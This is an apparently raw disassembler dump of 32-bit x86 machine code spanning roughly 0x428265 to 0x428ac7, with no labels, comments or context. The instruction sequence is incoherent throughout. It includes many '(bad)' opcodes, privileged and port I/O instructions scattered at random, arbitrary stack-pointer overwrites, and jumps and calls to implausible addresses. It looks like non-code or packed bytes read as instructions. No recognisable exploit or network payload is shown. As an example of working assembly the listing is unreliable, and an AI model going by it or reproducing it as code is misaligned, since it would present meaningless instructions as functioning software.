  428265:	push   cs
  428266:	mov    BYTE PTR [edx+0xc601e1],0xe2
  42826d:	or     BYTE PTR [ebx],dh
  42826f:	dec    ecx
  428270:	lea    eax,[ebx]
  428272:	xor    eax,0x18fc0fc7
  428277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428278:	repz clc 
  42827a:	add    eax,DWORD PTR [ebp+0x46]
  42827d:	prefetcht0 BYTE PTR [ecx-0x2]
  428281:	xor    eax,0x7c60872
  428286:	mov    esp,0xbd32c698
  42828b:	pop    esi
  42828c:	mov    cl,0xbe
  42828f:	or     al,0xc6
  428291:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  428298:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  42829f:	add    dh,al
  4282a1:	mov    eax,ebx
  4282a3:	xor    DWORD PTR [ebx],0x35008dbc
  4282a9:	mov    ecx,DWORD PTR [edi]
  4282ab:	sbb    al,0x18
  4282ad:	inc    ebp
  4282ae:	xrelease mov DWORD PTR [ebx],0x188546f4
  4282b5:	clc    
  4282b6:	(bad)  
  4282b7:	cmp    BYTE PTR [edx-0x64],dh
  4282ba:	lea    ecx,[ecx+0x45ffe838]
  4282c0:	mov    ecx,esp
  4282c2:	fadd   st,st(6)
  4282c4:	dec    ebp
  4282c5:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4282cb:	out    0x1,eax
  4282cd:	inc    ebp
  4282ce:	lea    ebp,ds:0xc8ffc6ff
  4282d4:	enter  0xa33,0xc6
  4282d8:	push   ebp
  4282d9:	leave  
  4282da:	(bad)  
  4282db:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  4282e1:	add    BYTE PTR [ebp+0x44],al
  4282e4:	mov    eax,esp
  4282e6:	mov    WORD PTR [esi+0x43398300],?
  4282ec:	psubusw mm4,QWORD PTR [eax-0x78]
  4282f0:	add    BYTE PTR [ebx-0x1303f975],al
  4282f6:	add    BYTE PTR [ebp+0x1],0xf3
  4282fa:	add    BYTE PTR [ebp+0x38],al
  4282fd:	in     eax,dx
  4282fe:	inc    ebp
  4282ff:	inc    ebp
  428300:	mov    esp,ebx
  428302:	add    BYTE PTR [ebp+0x0],0xee
  428306:	mov    DWORD PTR [ebp-0x48],eax
  428309:	sub    eax,0x2e00454f
  42830e:	js     0x428355
  428310:	data16 js 0x428298
  428313:	idiv   bh
  428315:	inc    esp
  428316:	(bad)  
  428317:	fadd   st(7),st
  428319:	mov    dh,0x89
  42831b:	and    DWORD PTR [esi+0x43],0xffffffff
  42831f:	fld    DWORD PTR [ebx-0x767cc078]
  428325:	pop    es
  428326:	push   0x8d45ffec
  42832b:	in     eax,dx
  42832c:	inc    DWORD PTR [ebp-0x77]
  42832f:	loopne 0x42839b
  428331:	inc    ebp
  428332:	jmp    esp
  428334:	add    DWORD PTR [ebp+0x11],0xfffffff1
  428338:	mov    DWORD PTR [ebp+0x6c],eax
  42833b:	(bad)  
  42833d:	inc    ebp
  42833e:	(bad)  
  42833f:	call   0xe7cbc850
  428344:	outs   dx,BYTE PTR ds:[esi]
  428345:	inc    ebp
  428346:	(bad)  
  428347:	js     0x4282cc
  428349:	div    BYTE PTR ds:0x70bc8944
  42834f:	mov    dh,0xff
  428351:	or     DWORD PTR [ebp-0x7626f5bd],0xffffff88
  428358:	jb     0x4282dd
  42835a:	dec    DWORD PTR [eax]
  42835c:	mov    ebp,esp
  42835e:	test   WORD PTR [ebp-0x1],ax
  428365:	inc    ebp
  428366:	ror    BYTE PTR [ebx-0x117a279a],0xff
  42836d:	adc    edi,edi
  42836f:	mov    ecx,esi
  428371:	mov    eax,DWORD PTR [eax]
  428373:	cmp    BYTE PTR [esi-0x1],ah
  428376:	test   DWORD PTR [ebx],edi
  428378:	push   DWORD PTR [ebp-0x1]
  42837b:	mov    DWORD PTR [esi-0x48],ebp
  42837e:	add    BYTE PTR [ebp+0x66],al
  428381:	jmp    0x428308
  428383:	pushf  
  428384:	dec    DWORD PTR [ebx-0x7f9c0301]
  42838a:	add    BYTE PTR [ecx],al
  42838c:	data16 add BYTE PTR [ebp-0x7a00c8],al
  428393:	add    al,al
  428395:	add    BYTE PTR [esi+0x45],ah
  428398:	test   DWORD PTR [ebx+0xff7cff],ecx
  42839e:	dec    esp
  42839f:	mov    DWORD PTR [eax],eax
  4283a1:	mov    esp,DWORD PTR [esi-0x4]
  4283a4:	inc    ebp
  4283a5:	cmp    BYTE PTR [eax+0x4701],0x38
  4283ac:	mov    DWORD PTR [ecx-0x7e],esp
  4283af:	add    BYTE PTR [edi-0x73],al
  4283b2:	push   0xffffffd1
  4283b4:	mov    WORD PTR [ebp+0x64],ax
  4283b8:	(bad)  
  4283b9:	call   eax
  4283bb:	mov    esp,eax
  4283bd:	data16 icebp 
  4283bf:	test   DWORD PTR [ebp-0x1],eax
  4283c2:	(bad)  
  4283c4:	out    0xc0,eax
  4283c6:	lea    esp,[esi-0x30]
  4283c9:	test   DWORD PTR [edx+0x43ff80ff],ecx
  4283cf:	inc    edi
  4283d0:	jmp    0x75ff:0x40858866
  4283d7:	dec    DWORD PTR [ebp-0x7a992f40]
  4283dd:	test   esi,edi
  4283df:	(bad)  
  4283e0:	(bad)  
  4283e1:	inc    DWORD PTR [ebp-0x9901b9]
  4283e7:	test   DWORD PTR [ebx+0x50fff4ff],ecx
  4283ed:	rcl    BYTE PTR [ecx+0x66],0x33
  4283f1:	test   DWORD PTR [ebx+0xff72ff],edi
  4283f7:	inc    edi
  4283f8:	ret    
  4283f9:	mov    ax,WORD PTR [ebp-0x3f0004]
  428400:	push   eax
  428401:	mov    DWORD PTR [ebp-0x77],0xff98748b
  428408:	add    BYTE PTR [ebx-0x764ff439],al
  42840e:	push   DWORD PTR [esi+0x1]
  428411:	inc    DWORD PTR [eax]
  428413:	mov    eax,0xff99ff
  428418:	or     BYTE PTR [ecx-0x7a87bb],cl
  42841e:	jne    0x4283d8
  428420:	add    DWORD PTR [edx-0x76edff72],0xff707a8d
  42842a:	mov    ecx,0xd74fb8
  42842f:	add    cl,al
  428431:	mov    DWORD PTR [ecx-0x3f007784],ecx
  428437:	or     DWORD PTR [ebx+0x558966ec],0x7e
  42843e:	(bad)  
  42843f:	push   ebp
  428441:	mov    eax,0x8c2789
  428446:	ret    0x6689
  428449:	adc    BYTE PTR [ebp+0x4c],0x8d
  42844d:	add    bl,bl
  42844f:	mov    WORD PTR [ebp-0x70],ax
  428453:	(bad)  
  428454:	ret    0x660d
  428457:	or     BYTE PTR [ebp-0x77],dl
  42845a:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  428461:	in     al,0x89
  428463:	(bad)  
  428464:	xchg   esi,eax
  428465:	aam    0xcf
  428467:	call   0x45dafcf5
  42846c:	dec    edx
  42846d:	pop    ecx
  42846e:	mov    edx,DWORD PTR [eax]
  428470:	repnz push bp
  428473:	or     BYTE PTR [ebx+0x5510663b],0x49
  42847a:	(bad)  
  42847b:	repnz xor eax,0xa0898945
  428481:	mov    ah,0x89
  428483:	jmp    DWORD PTR [edx+0x66b0418d]
  428489:	inc    DWORD PTR [ebp+0x50]
  42848c:	add    DWORD PTR [ebp-0x5],0xffffffbe
  428490:	mov    DWORD PTR [eax],ecx
  428492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428493:	pop    es
  428494:	inc    ecx
  428495:	(bad)  
  428496:	cbw    
  428498:	inc    ebp
  428499:	xor    ah,BYTE PTR [esi+0x3]
  42849c:	dec    ebp
  42849d:	push   eax
  42849e:	inc    bp
  4284a0:	jge    0x428425
  4284a2:	mov    esp,DWORD PTR [esi-0x18]
  4284a5:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4284ab:	add    DWORD PTR [ebx],esi
  4284ad:	add    BYTE PTR [ebx],al
  4284af:	test   DWORD PTR [ebx],esi
  4284b1:	(bad)  
  4284b2:	inc    WORD PTR [ebp+0x0]
  4284b6:	mov    eax,DWORD PTR [eax]
  4284b8:	call   0x88983bed
  4284bd:	mov    esi,eax
  4284bf:	clc    
  4284c0:	ret    
  4284c1:	rol    cl,0xa
  4284c4:	mov    DWORD PTR ds:0x7c0ec88,esi
  4284ca:	mov    edx,edi
  4284cc:	pushf  
  4284cd:	pop    es
  4284ce:	jmp    FWORD PTR [edx+0x66]
  4284d1:	add    BYTE PTR [ebp-0x990175],al
  4284d7:	inc    ebp
  4284d8:	test   DWORD PTR [ebx-0x2f000202],eax
  4284de:	push   ebp
  4284df:	mov    edi,eax
  4284e1:	mov    dh,BYTE PTR [eax+0x266ff51]
  4284e7:	push   ebp
  4284e8:	add    BYTE PTR [ebx-0x764b1777],al
  4284ee:	dec    DWORD PTR [esi+0x661851e8]
  4284f4:	add    BYTE PTR [ebp-0x7b],dl
  4284f7:	cmp    esi,0xfffffffb
  4284fa:	dec    DWORD PTR [ecx+0x51fe9285]
  428500:	jmp    DWORD PTR [esi-0x75]
  428503:	push   ebp
  428504:	hlt    
  428505:	data16 (bad) 
  428507:	dec    ebp
  428508:	ret    
  428509:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  42850f:	lea    edx,[eax-0x1]
  428512:	jne    0x4284e5
  428514:	dec    DWORD PTR [ecx-0x2f7a63f8]
  42851a:	dec    BYTE PTR [ecx+0x51559eff]
  428520:	mov    DWORD PTR [esi-0x4c],esp
  428523:	push   ebp
  428524:	jmp    DWORD PTR [esi-0x18]
  428527:	inc    ebp
  428528:	sbb    BYTE PTR [ebp-0x767ae500],cl
  42852e:	(bad)  
  42852f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428530:	inc    eax
  428532:	test   DWORD PTR [esi-0x2],esp
  428535:	inc    ebp
  428536:	dec    DWORD PTR [ebp-0x760bde75]
  42853c:	(bad)  
  42853d:	test   al,0xc3
  42853f:	mov    DWORD PTR [ebp-0x769b56],ecx
  428545:	lods   al,BYTE PTR ds:[esi]
  428546:	push   eax
  428547:	inc    ebp
  428548:	jne    0x428559
  42854a:	dec    DWORD PTR [ebp+0x8]
  42854d:	mov    eax,DWORD PTR [edi]
  42854f:	sbb    al,0x0
  428551:	(bad)  
  428552:	mov    eax,0xc14fc3
  428557:	mov    DWORD PTR [eax-0x64],edi
  42855a:	inc    bp
  42855c:	test   DWORD PTR [edi],ecx
  42855e:	dec    DWORD PTR [ebp-0x1]
  428561:	xor    eax,edi
  428563:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  428569:	inc    ebp
  42856a:	xor    DWORD PTR [ebx],0x3f
  42856d:	mov    WORD PTR [ebp-0x1bc],ax
  428574:	lea    ecx,[ecx-0x767702]
  42857a:	inc    esi
  42857b:	(bad)  
  42857c:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  428583:	pushf  
  428584:	rol    DWORD PTR [ebp-0x72019a],0xff
  42858b:	add    bh,bh
  42858d:	add    BYTE PTR [edi],cl
  42858f:	test   DWORD PTR [eax],eax
  428591:	(bad)  
  428592:	dec    WORD PTR [ebp-0xff002d]
  428599:	mov    DWORD PTR [eax+edi*4+0x0],edi
  42859d:	jmp    DWORD PTR [esi-0x73]
  4285a0:	lea    esi,[eax+0x50ffffff]
  4285a6:	fadd   QWORD PTR [ebp+0x0]
  4285a9:	xor    esp,DWORD PTR [esi+0x3]
  4285ac:	lea    edx,[eax-0x1]
  4285af:	test   edi,edi
  4285b1:	dec    DWORD PTR [ebp-0x1]
  4285b4:	mov    edi,edi
  4285b6:	dec    eax
  4285b7:	clc    
  4285b8:	call   DWORD PTR [ebp-0x73]
  4285bb:	lea    esi,[eax+0x51ffff88]
  4285c1:	lea    ecx,[ebp-0x78]
  4285c4:	test   WORD PTR [ebp-0x2],ax
  4285cb:	popf   
  4285cc:	push   eax
  4285cd:	add    BYTE PTR [ecx-0x77],dl
  4285d0:	xor    edi,DWORD PTR [eax-0x7236007d]
  4285d6:	cwde   
  4285d7:	mov    al,0x32
  4285d9:	inc    DWORD PTR [ebx]
  4285db:	push   eax
  4285dc:	push   ecx
  4285dd:	inc    ebp
  4285de:	shl    BYTE PTR [ebx],1
  4285e0:	lea    eax,[ebx]
  4285e2:	call   DWORD PTR [eax-0x1]
  4285e5:	test   DWORD PTR [ebx],esi
  4285e7:	inc    DWORD PTR [eax-0x1]
  4285ea:	(bad)  
  4285eb:	(bad)  
  4285ec:	(bad)  
  4285ed:	clc    
  4285ee:	call   DWORD PTR [ebp+0x50]
  4285f1:	jmp    0xcb876b
  4285f6:	inc    esp
  4285f7:	jnp    0x4285f8
  4285f9:	add    BYTE PTR [ecx-0x484f73],cl
  4285ff:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  428605:	mov    eax,DWORD PTR [ecx]
  428607:	data16 add BYTE PTR [ebp-0xb50077],al
  42860e:	inc    eax
  428610:	lea    esp,[esi+0x14]
  428613:	test   DWORD PTR [ecx-0xb301],ecx
  428619:	inc    edi
  42861a:	(bad)  
  42861b:	dec    si
  42861d:	test   edi,edi
  42861f:	(bad)  
  428620:	cmp    eax,0xc74f73ff
  428625:	mov    edx,DWORD PTR [edx-0x7d]
  428628:	push   DWORD PTR [ebx+0x56328939]
  42862e:	(bad)  
  42862f:	call   FWORD PTR [esi-0x47]
  428632:	inc    DWORD PTR ds:0x893c00ea
  428638:	(bad)  
  428639:	pop    eax
  42863a:	mov    ah,0xff
  42863c:	(bad)  
  42863d:	mov    ecx,0x5745
  428642:	dec    DWORD PTR [ecx-0xf7a501]
  428648:	(bad)  
  428649:	mov    ecx,0x456108
  42864e:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  428654:	test   BYTE PTR [ebp-0x72ff23fd],cl
  42865a:	inc    BYTE PTR gs:[eax]
  42865d:	inc    DWORD PTR [ebp-0x73]
  428660:	cmp    dh,bh
  428662:	pushf  
  428663:	inc    edi
  428665:	mov    ebx,eax
  428667:	hlt    
  428668:	test   DWORD PTR [ecx-0xbab708],ecx
  42866e:	cmp    al,0xbe
  428670:	pushf  
  428671:	or     bh,al
  428673:	pop    es
  428674:	lock into 
  428676:	test   eax,eax
  428678:	clc    
  428679:	mov    ebx,0x387245
  42867e:	lahf   
  42867f:	retf   
  428680:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  428686:	add    edi,edi
  428688:	add    BYTE PTR [ecx+0x45],dl
  42868b:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  428692:	mov    edx,DWORD PTR [ecx-0x74]
  428695:	inc    DWORD PTR [eax]
  428697:	cld    
  428698:	mov    eax,DWORD PTR [ebp-0x6f0175]
  42869e:	add    BYTE PTR [ebp-0x1b0177],al
  4286a4:	jge    0x4286eb
  4286a6:	test   DWORD PTR [ebx+0xff9875],ecx
  4286ac:	sbb    BYTE PTR [esi+0x55],ah
  4286af:	xchg   ebp,eax
  4286b0:	call   0x4281b4
  4286b5:	push   edi
  4286b6:	inc    ebp
  4286b7:	mov    dx,WORD PTR [ebp-0xfc0075]
  4286be:	cmp    al,0x85
  4286c0:	ud0    eax,DWORD PTR [ebp-0x1]
  4286c4:	test   DWORD PTR [edi+0x74],ecx
  4286c7:	dec    edi
  4286c8:	inc    DWORD PTR [ebp-0xf70004]
  4286ce:	dec    DWORD PTR [edi-0x75]
  4286d1:	dec    edi
  4286d2:	cld    
  4286d3:	test   DWORD PTR [eax+0xff01ff],eax
  4286d9:	icebp  
  4286da:	add    BYTE PTR [edi-0x3a],cl
  4286dd:	test   ebx,eax
  4286df:	inc    BYTE PTR [ebp-0x1]
  4286e2:	jne    0x4286e4
  4286e4:	mov    eax,DWORD PTR [eax]
  4286e6:	cld    
  4286e7:	xor    BYTE PTR [ecx+0x500155],cl
  4286ed:	push   ebp
  4286ee:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4286f4:	add    BYTE PTR [ebp+0x35e90f50],al
  4286fa:	add    al,BYTE PTR [eax]
  4286fc:	add    BYTE PTR [ebx-0x38fe4f80],al
  428702:	add    ah,ch
  428704:	or     BYTE PTR [ebp+0x4501f845],dh
  42870a:	jmp    0xde8a07
  42870f:	(bad)  
  428710:	nop    ecx
  428713:	test   DWORD PTR [ebp+0x4502f8],eax
  428719:	cmp    cl,BYTE PTR [ebp-0x64]
  42871c:	mov    eax,edi
  42871e:	mov    ebx,DWORD PTR [eax+edx*2]
  428721:	add    eax,0x45fef885
  428726:	dec    DWORD PTR [ebx+0x339445]
  42872c:	add    ecx,DWORD PTR [ecx+0x4500f889]
  428732:	dec    DWORD PTR [ebx-0x460f0375]
  428738:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428739:	add    esi,edi
  42873b:	add    bh,bh
  42873d:	rdpmc  
  42873f:	add    BYTE PTR [ebx],0x1
  428742:	mov    DWORD PTR [eax],eax
  428744:	add    al,0x45
  428746:	dec    DWORD PTR [ecx-0x360b3373]
  42874c:	dec    DWORD PTR [esi]
  42874e:	push   eax
  42874f:	jne    0x428796
  428751:	mov    esi,DWORD PTR [ebx]
  428753:	cld    
  428754:	add    ebp,ebx
  428756:	push   eax
  428757:	inc    DWORD PTR [ebp-0x75]
  42875a:	add    eax,0x800e4
  42875f:	add    BYTE PTR [ebx-0x7f7403bf],cl
  428765:	mov    DWORD PTR [ecx],eax
  428767:	sbb    al,0x0
  428769:	leave  
  42876a:	test   DWORD PTR [edi-0x2],eax
  42876d:	jne    0x42876e
  42876f:	call   0xff437274
  428774:	xor    BYTE PTR [ebp+0x4d],al
  428777:	mov    edi,edi
  428779:	enter  0x8,0x4d
  42877d:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  428783:	mov    eax,DWORD PTR [eax]
  428785:	cld    
  428786:	add    DWORD PTR [ecx],ebx
  428788:	inc    ebp
  428789:	dec    ebp
  42878a:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  428790:	inc    eax
  428791:	dec    DWORD PTR [ecx-0x270375]
  428797:	add    BYTE PTR [ebx-0x39d72701],cl
  42879d:	xchg   ecx,eax
  42879e:	ret    
  42879f:	add    BYTE PTR [ebp-0x830075],al
  4287a5:	add    BYTE PTR [ebp-0x75],al
  4287a8:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4287ae:	lea    edi,[edi-0xc]
  4287b1:	add    bh,bh
  4287b3:	mov    edx,DWORD PTR [eax-0x7b]
  4287b6:	inc    ebp
  4287b7:	rdpmc  
  4287b9:	jne    0x4287be
  4287bb:	add    BYTE PTR [eax-0x75],dl
  4287be:	inc    ebp
  4287bf:	clc    
  4287c0:	add    eax,0x400009
  4287c5:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4287cb:	mov    eax,DWORD PTR [ecx]
  4287cd:	in     al,dx
  4287ce:	add    dh,al
  4287d0:	test   ebx,eax
  4287d2:	inc    BYTE PTR [ebp-0xff0001]
  4287d8:	add    BYTE PTR [ebp-0x43],al
  4287db:	cmp    esi,0xfffffff8
  4287de:	(bad)  
  4287df:	push   DWORD PTR [eax]
  4287e1:	add    BYTE PTR [ebp-0x3a],dl
  4287e4:	test   ebx,eax
  4287e6:	je     0x42876d
  4287e8:	mov    edi,edi
  4287ea:	sbb    al,0xff
  4287ec:	test   DWORD PTR gs:[eax],eax
  4287ef:	(bad)  
  4287f0:	js     0x4287f1
  4287f2:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4287f8:	sub    eax,ebx
  4287fa:	mov    ecx,DWORD PTR [ebx-0x55130377]
  428800:	add    eax,DWORD PTR [eax]
  428802:	dec    ebp
  428803:	push   eax
  428804:	mov    al,BYTE PTR [ebp+0x1]
  428807:	mov    eax,DWORD PTR [ebp-0x68]
  42880a:	mov    eax,DWORD PTR [eax]
  42880c:	sbb    bh,al
  42880e:	or     ah,dh
  428810:	dec    ebp
  428811:	inc    DWORD PTR [eax+0x4]
  428814:	push   ecx
  428815:	add    BYTE PTR [edx-0x1],dh
  428818:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  42881e:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  428828:	add    ecx,DWORD PTR [ecx-0x1be77477]
  42882e:	push   ecx
  42882f:	cmp    BYTE PTR [ebx],al
  428831:	inc    ebp
  428832:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  428838:	(bad)  
  428839:	(bad)  
  42883a:	in     al,0xff
  42883c:	add    BYTE PTR [ebp+0x0],al
  42883f:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  428845:	add    al,bh
  428847:	(bad)  
  428848:	jmp    0x8d85:0x74b0558d
  42884f:	dec    DWORD PTR [eax]
  428851:	call   DWORD PTR [ebp-0x7b]
  428854:	mov    edi,esi
  428856:	lock call DWORD PTR [ebp-0x75]
  42885a:	mov    esi,esp
  42885c:	mov    ah,0xc6
  42885e:	mov    bh,0xc3
  428860:	mov    DWORD PTR [ebx-0x110003c4],ecx
  428866:	add    DWORD PTR [eax],0x450050ff
  42886c:	mov    DWORD PTR [ebx+0x9598cc],ecx
  428872:	inc    edi
  428874:	push   esp
  428876:	jmp    0xcd00:0x680481ff
  42887d:	mov    DWORD PTR [ebx],esi
  42887f:	clc    
  428880:	cmp    edi,0xff9cff3b
  428886:	jne    0x428890
  428888:	mov    eax,eax
  42888a:	add    esi,DWORD PTR [eax]
  42888c:	int3   
  42888d:	inc    ebp
  42888e:	cmp    al,0x83
  428890:	add    BYTE PTR [eax],bl
  428892:	adc    DWORD PTR [ebx+0x768b5055],eax
  428898:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  42889e:	mov    edi,eax
  4288a0:	cmp    BYTE PTR [ebp+0x45],cl
  4288a3:	jmp    0x428830
  4288a5:	mov    ebx,DWORD PTR [esp+ebp*8]
  4288a8:	inc    ebp
  4288a9:	or     al,0x2
  4288ab:	dec    DWORD PTR [ebp+0x18]
  4288ae:	jne    0x428905
  4288b0:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4288b6:	mov    edi,DWORD PTR [ebx]
  4288b8:	in     al,0x50
  4288ba:	xchg   ecx,eax
  4288bb:	jmp    0x342d7c0
  4288c0:	adc    al,0x8b
  4288c2:	inc    ebp
  4288c3:	mov    al,ds:0x8b04008b
  4288c8:	push   ebp
  4288c9:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4288cf:	push   ebp
  4288d0:	test   DWORD PTR [ebx-0x2800d701],ecx
  4288d6:	inc    ebp
  4288d7:	dec    ebp
  4288d8:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  4288de:	mov    DWORD PTR [eax],0xe9ff00f4
  4288e4:	add    al,0x0
  4288e6:	add    BYTE PTR [eax],al
  4288e8:	mov    eax,edx
  4288ea:	push   eax
  4288eb:	rol    DWORD PTR [ebp-0xf0177],1
  4288f1:	bound  eax,QWORD PTR [ebp+0x50]
  4288f4:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4288fa:	add    BYTE PTR [ecx+0x558df0ff],cl
  428900:	mov    al,0xf
  428902:	test   DWORD PTR [edx],edx
  428904:	call   DWORD PTR [ebp-0x7a0001]
  42890a:	(bad)  
  42890b:	loop   0x42890c
  42890d:	jnp    0xc6987d13
  428913:	mov    eax,ebx
  428915:	cmp    al,0x8b
  428917:	(bad)  
  428918:	cld    
  428919:	shr    esi,0xc
  42891c:	add    dl,al
  42891e:	push   eax
  42891f:	lea    eax,[ebp-0x1]
  428922:	mov    edx,esi
  428924:	cwde   
  428925:	cli    
  428926:	add    BYTE PTR [ebp+0x1ffff8ff],al
  42892c:	or     BYTE PTR [eax],cl
  42892e:	inc    ebp
  42892f:	dec    ebp
  428930:	inc    DWORD PTR [ebx+0x74803914]
  428936:	add    DWORD PTR [ebx+0x451800],ecx
  42893c:	call   DWORD PTR [eax+edx*1]
  42893f:	add    ecx,DWORD PTR [ebp-0x34]
  428942:	push   edi
  428943:	adc    al,0x8
  428945:	mov    edx,DWORD PTR [ebp-0x14]
  428948:	mov    ecx,DWORD PTR [ebp+0x18]
  42894b:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  42894f:	inc    DWORD PTR [eax+esi*8]
  428952:	inc    ebp
  428953:	stos   BYTE PTR es:[edi],al
  428954:	mov    edx,DWORD PTR [ebp-0x4]
  428957:	add    DWORD PTR [ebp-0x1c],eax
  42895a:	mov    edx,DWORD PTR [ebp-0x70]
  42895d:	cmp    eax,DWORD PTR [eax]
  42895f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428960:	mov    eax,DWORD PTR [eax]
  428962:	cld    
  428963:	jae    0x4288e5
  428965:	add    eax,DWORD PTR [ecx]
  428967:	clc    
  428968:	add    BYTE PTR [eax+0x30],dl
  42896b:	mov    DWORD PTR [ecx],esi
  42896d:	clc    
  42896e:	pop    ds
  42896f:	inc    ebp
  428970:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  428976:	(bad)  
  428977:	push   DWORD PTR [edi]
  428979:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  42897f:	(bad)  
  428980:	jae    0x428981
  428982:	mov    eax,DWORD PTR [ebp-0x740175]
  428988:	sub    eax,DWORD PTR [eax]
  42898a:	add    eax,DWORD PTR [eax]
  42898c:	mov    DWORD PTR [ecx+0x5f],eax
  42898f:	mov    DWORD PTR [ebx-0x4],ebx
  428992:	ret    0xff
  428995:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  42899b:	ret    
  42899c:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4289a2:	add    BYTE PTR [ebp-0x7d],al
  4289a5:	mov    DWORD PTR [eax],eax
  4289a7:	add    al,0x84
  4289a9:	inc    DWORD PTR [ecx]
  4289ab:	lea    eax,[eax]
  4289ad:	hlt    
  4289ae:	sar    bh,cl
  4289b0:	test   BYTE PTR [eax+0x1],dl
  4289b3:	inc    ebp
  4289b4:	add    BYTE PTR [ebx],dh
  4289b6:	test   BYTE PTR [ebx],0x84
  4289b9:	push   eax
  4289ba:	add    BYTE PTR [ebp+0x0],al
  4289bd:	add    eax,0x86
  4289c2:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4289c8:	add    BYTE PTR [ecx],al
  4289ca:	add    BYTE PTR [eax],al
  4289cc:	mov    esi,0x550030
  4289d1:	mov    ecx,DWORD PTR [edi]
  4289d3:	cld    
  4289d4:	fidiv  DWORD PTR [ebp+0x0]
  4289d7:	mov    edi,DWORD PTR [ecx]
  4289d9:	xor    BYTE PTR [eax+eax*1],0x84
  4289dd:	add    eax,DWORD PTR [eax]
  4289df:	sbb    BYTE PTR [eax],al
  4289e1:	jne    0x428994
  4289e3:	mov    eax,DWORD PTR [ecx]
  4289e5:	sbb    BYTE PTR [eax],al
  4289e7:	mov    DWORD PTR [ebp-0x1],esp
  4289ea:	add    BYTE PTR [eax+0x30e45ca],bh
  4289f0:	ret    0xb7fc
  4289f3:	dec    ebp
  4289f4:	or     al,0x89
  4289f6:	dec    ebp
  4289f7:	cld    
  4289f8:	cmovne ecx,DWORD PTR [eax-0x75]
  4289fc:	add    edi,esp
  4289fe:	seto   BYTE PTR [esi-0x72ffffff]
  428a05:	inc    ebp
  428a06:	adc    al,0x8b
  428a08:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  428a0f:	cmp    DWORD PTR [edi+0x72],edx
  428a12:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  428a18:	gs cmp al,0x0
  428a1b:	je     0x4289f3
  428a1d:	push   eax
  428a1e:	sar    BYTE PTR [eax],1
  428a20:	mov    bh,0x3e
  428a22:	push   cs
  428a23:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  428a29:	add    DWORD PTR [ecx+0x12],ebp
  428a2c:	dec    edx
  428a2d:	(bad)  
  428a2e:	mov    eax,edx
  428a30:	in     al,dx
  428a31:	adc    DWORD PTR [ecx],esi
  428a33:	pop    esi
  428a34:	inc    ecx
  428a35:	leave  
  428a36:	or     DWORD PTR [eax],ebx
  428a38:	gs push ebp
  428a3a:	add    ah,ch
  428a3c:	into   
  428a3d:	in     al,dx
  428a3e:	enter  0xb756,0xf0
  428a42:	push   cs
  428a43:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  428a4d:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  428a53:	jnp    0x74430f5b
  428a59:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  428a5f:	add    BYTE PTR [edi],cl
  428a61:	mov    edi,DWORD PTR [ecx-0x78]
  428a64:	ltr    WORD PTR [ecx-0x7b]
  428a68:	dec    DWORD PTR [edi]
  428a6a:	clc    
  428a6b:	out    0x45,eax
  428a6d:	add    BYTE PTR [eax],cl
  428a6f:	cmp    ebx,0xffffff8c
  428a72:	jge    0x428a74
  428a74:	jb     0x428a86
  428a76:	je     0x518af6
  428a7c:	pop    edx
  428a7d:	push   esi
  428a7e:	mov    ecx,DWORD PTR [edi]
  428a80:	in     al,dx
  428a81:	rol    DWORD PTR [ebp+0x0],1
  428a84:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  428a8b:	cmp    DWORD PTR [ecx],0xfffffff0
  428a8e:	hlt    
  428a8f:	mov    esp,DWORD PTR [eax+0xf034d2b]
  428a95:	(bad)  
  428a97:	push   eax
  428a98:	jns    0xb8426f16
  428a9e:	lock push cs
  428aa0:	ror    edx,0x3
  428aa3:	test   BYTE PTR [ecx+0x5500e800],cl
  428aa9:	dec    eax
  428aaa:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  428aae:	(bad)  
  428aaf:	mov    esi,0x7f33ff5f
  428ab4:	inc    eax
  428ab5:	test   DWORD PTR [edx],eax
  428ab7:	je     0x428a79
  428ab9:	mov    ecx,ecx
  428abb:	adc    DWORD PTR [ebp-0xc],0xffffffec
  428abf:	and    eax,DWORD PTR [eax+0xf0103]
  428ac5:	jp     0x428ab3
  428ac7:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
